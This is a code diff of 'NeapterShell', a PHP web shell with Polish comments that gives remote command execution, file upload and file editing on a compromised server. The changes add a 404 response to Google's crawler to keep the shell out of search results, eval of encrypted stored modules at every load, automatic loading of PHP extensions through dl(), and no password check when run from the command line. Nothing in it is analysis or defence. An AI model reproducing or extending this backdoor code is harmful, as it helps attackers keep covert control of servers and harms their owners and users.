@@ -13,6 +13,7 @@ require_once dirname( __FILE__ ) . '/Lib/Arr.php';
 require_once dirname( __FILE__ ) . '/Lib/Request.php';
 require_once dirname( __FILE__ ) . '/Lib/ShellInterface.php';
 require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';
+require_once dirname( __FILE__ ) . '/Lib/XRecursiveDirectoryIterator.php';
 
 /**
  * class Shell - Zarzadzanie serwerem
@@ -20,7 +21,7 @@ require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';
  * @author    Krzysztof Otręba <krzotr@gmail.com>
  * @copyright Copyright (c) 2011, Krzysztof Otręba
  *
- * @version 0.40
+ * @version 0.41
  *
  * @uses Arr
  * @uses Request
@@ -31,29 +32,22 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.41 b111017';
+	const VERSION = '0.50 b120126';
 
 	/**
 	 * Help, natywne polecenia
 	 */
-	const HELP = '
-help - Wyświetlanie pomocy
-modules - Informacje o modułach
-edit - Edycja oraz tworzenie nowego pliku
-upload - Wrzucanie pliku na serwer
-system, exec - Uruchomienie polecenia systemowego
-info - Wyświetla informacje o systemie
-logout - Wylogowanie';
+	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\nversion - Wyświetlanie numeru wersji shell'a\r\nlogout - Wylogowanie";
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
 	 *
-	 * format: sha1( $user . "\xff" . $pass );
+	 * format: sha1( $sUser . "\xff" . $sPass );
 	 *
-	 * @access public
+	 * @access private
 	 * @var    string
 	 */
-	public $sAuth;
+	private $sAuth;
 
 	/**
 	 * Czas generowania strony
@@ -236,12 +230,12 @@ logout - Wylogowanie';
 	public $bDev = FALSE;
 
 	/**
-	 * Jezeli TRUE to skrypty JavaScript sa wlaczone
+	 * Jezeli FALSE to skrypty JavaScript sa wlaczone
 	 *
 	 * @access public
-	 * @var     boolean
+	 * @var    boolean
 	 */
-	public $bJs = TRUE;
+	public $bNoJs = FALSE;
 
 	/**
 	 * Konstruktor
@@ -253,6 +247,35 @@ logout - Wylogowanie';
 	 */
 	public function __construct()
 	{
+		/**
+		 * Autoryzacja
+		 *
+		 * @see self::$sAuth
+		 */
+		if( defined( 'NF_AUTH' ) && preg_match( '~^[a-f0-9]{40}\z~', (string) NF_AUTH ) )
+		{
+			$this -> sAuth = NF_AUTH;
+		}
+
+		/**
+		 * @see Request::init
+		 *
+		 * Dostep do zmiennych poprzez metody. Nie trzeba za kazdym razem uzywac konstrukcji:
+		 *   ( isset( $_GET['test'] ) && ( $_GET['test'] === 'test' ) )
+		 * tylko
+		 *   ( Request::getGet( 'test' ) === 'test' )
+		 */
+		Request::init();
+
+		/**
+		 * Blokowanie google bota; baidu, bing, yahoo moga byc
+		 */
+		if( stripos( Request::getServer( 'HTTP_USER_AGENT' ), 'Google' ) !== FALSE )
+		{
+			header( 'HTTP/1.0 404 Not Found' );
+			exit ;
+		}
+
 		/**
 		 * Czas generowania strony
 		 */
@@ -306,30 +329,14 @@ logout - Wylogowanie';
 		}
 
 		/**
-		 * @see Request::init
-		 *
-		 * Dostep do zmiennych poprzez metody. Nie trzeba za kazdym razem uzywac konstrukcji:
-		 *   ( isset( $_GET['test'] ) && ( $_GET['test'] === 'test' ) )
-		 * tylko
-		 *   ( Request::getGet( 'test' ) === 'test' )
-		 */
-		Request::init();
-
-		/**
 		 * Tryb deweloperski
 		 */
-		if( isset( $_GET['dev'] ) )
-		{
-			$this -> bDev = TRUE;
-		}
+		$this -> bDev = isset( $_GET['dev'] );
 
 		/**
 		 * Wylaczenie JavaScript
 		 */
-		if( isset( $_GET['nojs'] ) )
-		{
-			$this -> bJs = FALSE;
-		}
+		$this -> bNoJs = isset( $_GET['nojs'] );
 
 		/**
 		 * disable_functions
@@ -354,7 +361,7 @@ logout - Wylogowanie';
 		/**
 		 * Unikalny klucz
 		 */
-		$this -> sKey = sha1( $sScriptFilename = Request::getServer( 'SCRIPT_FILENAME' ), TRUE ) . md5( md5_file( $sScriptFilename ), TRUE ) . md5( $sScriptFilename, TRUE );
+		$this -> sKey = md5( md5_file( $sScriptFilename = Request::getServer( 'SCRIPT_FILENAME' ) ), TRUE ) . md5( $sScriptFilename, TRUE ) . sha1( $sScriptFilename, TRUE );
 
 		/**
 		 * Prefix
@@ -397,23 +404,40 @@ logout - Wylogowanie';
 		}
 
 		/**
-		 * p jak PURE
+		 * Uruchomienie shella z domyslna konfiguracja - bez wczytywania ustawien
+		 * bez rozszerzen i modulow
 		 */
-		if(    ! isset( $_GET['p'] )
-		    && is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_modules' )
-		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
-		)
+		if( ! isset( $_GET['pure'] ) )
 		{
 			/**
-			 * f jak FLUSH
+			 * Wczytywanie modulow
 			 */
-			if( isset( $_GET['f'] ) )
-			{
-				unlink( $sFilePath );
-			}
-			else
+			if(    is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_modules' )
+		            && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
+			)
 			{
 				eval( '?>' . $this -> decode( $sData ) . '<?' );
+			}
+
+			/**
+			 * Wczytywanie rozszerzen
+			 */
+			if(    is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_autoload' )
+		            && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
+			)
+			{
+				/**
+				 * Unserializacja i deszyfrowanie
+				 */
+				$aAutoload = unserialize( $this -> decode( $sData ) );
+
+				/**
+				 * Wczytywanie rozszerzen
+				 */
+				foreach( $aAutoload as $sExtension )
+				{
+					$this -> dl( $sExtension );
+				}
 			}
 		}
 
@@ -557,6 +581,50 @@ logout - Wylogowanie';
 		}
 
 		return $sNewData;
+	}
+
+	/**
+	 * Wczytanie rozszerzenia
+	 *
+	 * @access public
+	 * @param  string  $sExtension Nazwa rozszerzenia lub sciezka do pliku
+	 * @return boolean             TRUE w przypadku pomyslnego zaladowania biblioteki
+	 */
+	public function dl( $sExtension )
+	{
+		/**
+		 * Nazwa rozszerzenia
+		 */
+		$sName = basename( $sExtension );
+
+		if( ( $iPos = strrpos( $sName, '.' ) ) !== FALSE )
+		{
+			$sName = substr( $sName, 0, $iPos - 1 );
+		}
+		else
+		{
+			$sExtension .= '.so';
+		}
+
+		/**
+		 * Czy rozszerzenie jest juz zaladowane
+		 */
+		if( extension_loaded( $sName ) )
+		{
+			return TRUE;
+		}
+
+		/**
+		 * Aby `dl` dzialalo poprawnie wymagane jest wylaczone safe_mode,
+		 * wlaczenie dyrektywy enable_dl. Funkcja `dl` musi istniec
+		 * i nie moze znajdowac sie na liscie wylaczonych funkcji
+		 */
+		if( ! $this -> bSafeMode && function_exists( 'dl' ) && ini_get( 'enable_dl' ) && ! in_array( 'dl', $this -> aDisableFunctions ) )
+		{
+			return dl( $sExtension );
+		}
+
+		return FALSE;
 	}
 
 	/**
@@ -836,6 +904,109 @@ DATA;
 	}
 
 	/**
+	 * Komenda - autoload
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandAutoload()
+	{
+		if( $this -> bHelp  || ( ( $this -> iArgc === 0 ) && ( $this -> aOptv === array() ) ) )
+		{
+			return <<<DATA
+Wczytywanie rozszerzeń PHP
+
+	Rozszerzenia te wczytywane są za każdym razem podczas startu
+
+	Użycie:
+		autoload -l - wyświetlanie rozszerzen, które zostały wczytane
+		autoload -f - odłączenie wszystkich rozszerzen
+		autoload nazwa_rozszerzenia [sciezka_do_rozszerzenia rozszerzenie]
+
+	Przykład:
+		autoload imap
+DATA;
+		}
+
+		/**
+		 * Lista poprzednio wczytanych rozszerzen
+		 */
+		$aAutoload = array();
+
+		if(    is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_autoload' )
+		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
+		)
+		{
+			$aAutoload = unserialize( $this -> decode( $sData ) );
+		}
+
+		/**
+		 * List
+		 */
+		if( in_array( 'l', $this -> aOptv ) )
+		{
+			if( $aAutoload === array() )
+			{
+				return 'Nie wczytano żadnych rozszerzeń';
+			}
+
+			/**
+			 * Wczytywanie rozszerzen
+			 */
+			$sOutput = NULL;
+
+			foreach( $aAutoload as $sExtension )
+			{
+				$sOutput .= $sExtension . "\r\n";
+			}
+
+			return "Wczytane rozszerzenia:\r\n\r\n" . $sOutput;
+		}
+
+		/**
+		 * Flush
+		 */
+		if( in_array( 'f', $this -> aOptv ) )
+		{
+			return sprintf( 'Plik z rozszerzeniami %szostał usunięty', ! unlink( $this -> sTmp . '/' . $this -> sPrefix . '_autoload' ) ? 'nie ' : NULL );
+		}
+
+		/**
+		 * Wczytywanie rozszerzen
+		 */
+		$sOutput = NULL;
+
+		foreach( $this -> aArgv as $sExtension )
+		{
+			/**
+			 * Czy rozszerzenie zostalo juz poprzednio wczytane
+			 */
+			if( in_array( $sExtension, $aAutoload ) )
+			{
+				$sOutput .= sprintf( "Poprzednio wczytany - %s\r\n", $sExtension );
+				continue ;
+			}
+
+			/**
+			 * Wczytywanie rozszerzenia
+			 */
+			if( ( $bLoaded = $this -> dl( $sExtension ) ) )
+			{
+				$aAutoload[] = $sExtension;
+			}
+
+			$sOutput .= sprintf( "%s - %s\r\n", ( $bLoaded ? '    Wczytano' : 'Nie wczytano' ), $sExtension );
+		}
+
+		/**
+		 * Zapis rozszerzen do pliku
+		 */
+		file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . '_autoload', $this -> encode( serialize( $aAutoload ) ) );
+
+		return $sOutput;
+	}
+
+	/**
 	 * Komenda - cd
 	 *
 	 * @access private
@@ -1097,6 +1268,31 @@ DATA;
 	}
 
 	/**
+	 * Version
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandVersion()
+	{
+		/**
+		 * Help
+		 */
+		if( $this -> bHelp )
+		{
+			return <<<DATA
+version - Wyświetlanie numeru wersji shell'a
+
+	Użycie:
+		version
+DATA;
+		}
+
+		return self::VERSION;
+
+	}
+
+	/**
 	 * Wrzucanie pliku
 	 *
 	 * @access private
@@ -1159,16 +1355,16 @@ info - Wyświetla informacje o systemie
 DATA;
 		}
 
-		return sprintf( "- SERVER:[%s], IP:[%s], Host:[%s]\r\nPHP:[%s], API:[%s], Url:[%s], Path:[%s]\r\nSAFE_MODE:[%d], EXE:[%d], CURL:[%d], SOCKET:[%s]",
+		return sprintf( "- SERVER:[%s], IP:[%s], Host:[%s]\r\nPHP:[%s], API:[%s], Url:[%s], Path:[%s]\r\nSAFE_MODE:[%d], EXE:[%d], CURL:[%d], SOCKET:[%d]",
 			php_uname(),
 			( $sIp = Request::getServer( 'REMOTE_ADDR' ) ),
 			gethostbyaddr( $sIp ),
 			PHP_VERSION,
 			php_sapi_name(),
-			( ( PHP_SAPI === 'cli ') ? 'CLI' : Request::getCurrentUrl() ),
+			( ( PHP_SAPI === 'cli' ) ? 'CLI' : Request::getCurrentUrl() ),
 			Request::getServer( 'SCRIPT_FILENAME' ),
-			(int) $this -> bSafeMode,
-			(int) $this -> bExec,
+			$this -> bSafeMode,
+			$this -> bExec,
 			function_exists( 'curl_init' ),
 			function_exists( 'socket_create' )
 
@@ -1270,7 +1466,7 @@ DATA;
 				}
 			}
 
-			$this -> sArgv = $this -> rmQuotes( rtrim($this -> sArgv ) );
+			$this -> sArgv = $this -> rmQuotes( rtrim( $this -> sArgv ) );
 
 			$this -> iArgc = count( $this -> aArgv );
 
@@ -1297,6 +1493,12 @@ DATA;
 					break ;
 				case 'info':
 					$sConsole = $this -> getCommandInfo();
+					break ;
+				case 'autoload':
+					$sConsole = $this -> getCommandAutoload();
+					break ;
+				case 'version':
+					$sConsole = $this -> getCommandVersion();
 					break ;
 				case 'logout':
 					$sConsole = $this -> getCommandLogout();
@@ -1439,7 +1641,7 @@ DATA;
 		/**
 		 * Wylaczenie JavaScript
 		 */
-		if( ! $this -> bJs )
+		if( $this -> bNoJs )
 		{
 			$sScript = NULL;
 		}
@@ -1448,8 +1650,7 @@ DATA;
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'NeapterShell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
-return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
-<div id=\"body\">" .
+return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body><div id=\"body\">" .
 ( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
 "<div id=\"content\">{$sData}</div></div>" .
 ( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
@@ -1467,7 +1668,7 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 		/**
 		 * Uwierzytelnianie
 		 */
-		if( $this -> sAuth !== NULL )
+		if( ( PHP_SAPI !== 'cli' ) && ( $this -> sAuth !== NULL ) )
 		{
 			$sAuth = NULL;
 
@@ -1485,7 +1686,7 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 				    && ( $this -> sAuth === sha1( $sUser . "\xff" . $sPass ) ) )
 				)
 				{
-					$this -> bJs = FALSE;
+					$this -> bNoJs = TRUE;
 
 					echo $this -> getContent(
 							sprintf( '<form action="%s" method="post"><input type="text" name="user"/><input type="password" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
